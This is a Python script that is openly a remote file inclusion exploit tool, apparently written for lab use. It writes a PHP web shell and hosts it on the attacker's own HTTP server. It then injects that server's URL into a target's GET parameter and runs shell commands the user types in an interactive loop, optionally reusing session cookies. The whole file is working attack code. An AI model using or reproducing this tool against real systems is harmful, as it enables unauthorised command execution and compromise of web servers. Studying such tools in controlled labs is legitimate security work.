import os
import subprocess
import requests
from urllib.parse import urlparse, parse_qs

# Global variable to store the subprocess reference
server_process = None

def create_shell():
    """Create a PHP shell file."""
    shell_content = '<?php system($_GET["cmd"]); ?>'
    with open("shell.php", "w") as f:
        f.write(shell_content)
    print("[+] Shell created: shell.php")

def host_http_server():
    """Host the shell using Python's HTTP server."""
    global server_process
    try:
        server_process = subprocess.Popen(
            ["sudo", "python3", "-m", "http.server", "80"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        print("[+] HTTP server started on port 80.")
    except Exception as e:
        print(f"[-] Failed to start HTTP server: {e}")

def stop_server():
    """Stop the HTTP server if it's running."""
    global server_process
    if server_process:
        try:
            server_process.terminate()
            server_process.wait()  # Wait for the process to fully terminate
            print("[+] HTTP server stopped.")
        except Exception as e:
            print(f"[-] Failed to stop HTTP server: {e}")
        finally:
            server_process = None

def get_url_from_file(file_path):
    """Read the URL from GetResults.txt."""
    try:
        with open(file_path, "r") as f:
            url = f.readline().strip()
        if not url:
            raise ValueError("File is empty or does not contain a valid URL.")
        return url
    except FileNotFoundError:
        print(f"[-] File not found: {file_path}")
        return None
    except ValueError as e:
        print(f"[-] Error: {e}")
        return None

def extract_get_parameters(url):
    """Extract the GET parameters from the URL."""
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    return base_url, query_params

def construct_payload(base_url, params, ip_address, cmd):
    """Construct the final payload URL."""
    param_key = list(params.keys())[0]
    shell_url = f"http://{ip_address}/shell.php"
    payload = f"{base_url}?{param_key}={shell_url}&cmd={cmd}"
    return payload

def extract_response_before_doctype(response_text):
    """Extract everything before the <!DOCTYPE> tag in the response."""
    doctype_index = response_text.find("<!DOCTYPE")
    if doctype_index != -1:
        return response_text[:doctype_index].strip()
    return response_text.strip()

async def rfi_main():
    """Main function for RFI exploitation."""
    global server_process
    try:
        # Ask if the user needs help creating a shell
        create_shell_choice = input("Do you need help creating a shell? (Y/N): ").lower()
        if create_shell_choice == "y":
            create_shell()

        # Ask if the user wants to specify cookies
        use_cookies = input("Do you want to specify cookies? (Y/N): ").lower()
        cookies = {}
        if use_cookies == "y":
            cookie_input = input("Enter cookies in key=value format (e.g., PHPSESSID=abc123;security=low): ")
            try:
                # Parse cookies into a dictionary
                cookies = dict(cookie.strip().split("=") for cookie in cookie_input.split(";"))
            except ValueError:
                print("[-] Invalid cookie format. Please use 'key=value' pairs separated by ';'.")
                cookies = {}

        # Start the HTTP server
        host_http_server()

        # Ask for the user's IP address
        ip_address = input("What is your IP address? ")

        # Get the URL from GetResults.txt
        url = get_url_from_file("GetResults.txt")
        if not url:
            return

        # Extract the base URL and GET parameters
        base_url, params = extract_get_parameters(url)

        while True:
            # Ask for the command to run
            cmd = input("What command do you want to run? ")
            if not cmd:
                print("[-] Command cannot be empty.")
                continue

            # Construct the payload URL
            payload = construct_payload(base_url, params, ip_address, cmd)
            print(f"[+] Payload URL: {payload}")

            # Send the request and get the response
            try:
                response = requests.get(payload, cookies=cookies)
                response_text = response.text
                extracted_output = extract_response_before_doctype(response_text)
                print(f"[+] Command Output:\n{extracted_output}")
            except Exception as e:
                print(f"[-] Failed to fetch response: {e}")
                continue

            # Ask if the user wants to run another command
            run_again = input("Do you want to run another command? (Y/N): ").lower()
            if run_again != "y":
                print("[+] Exiting...")
                break
    finally:
        # Ensure the HTTP server is stopped when the program exits
        stop_server()